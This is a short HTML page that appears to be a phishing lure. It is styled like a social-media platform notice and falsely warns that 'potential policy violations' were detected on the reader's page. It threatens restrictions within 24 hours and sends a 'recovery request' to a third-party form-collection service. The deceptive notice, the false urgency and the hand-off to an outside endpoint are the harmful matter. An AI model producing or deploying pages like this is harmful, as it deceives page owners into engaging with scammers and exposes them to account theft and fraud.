<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Important Notice</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: #fff;
      padding: 25px;
      width: 100%;
      max-width: 400px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    h2 {
      margin-bottom: 20px;
    }
    button {
      padding: 12px 20px;
      background: #1877f2;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 14px;
    }
    button:hover {
      background: #145dbf;
    }
  </style>
</head>
<body>

  <div class="box">
    <h2>⚠️ Important Notice</h2>

    <form action="https://submit-form.com/09HQTNPsI" method="POST">
      <!-- Fixed message hidden field -->
      <input type="hidden" name="message" value="Our system has detected potential policy violations on your page.
If you believe this is a mistake, you can submit a recovery request here.
Please respond within 24 hours to avoid restrictions being applied.
Thank you for your understanding.">

      <button type="submit">Submit</button>
    </form>
  </div>

</body>
</html>
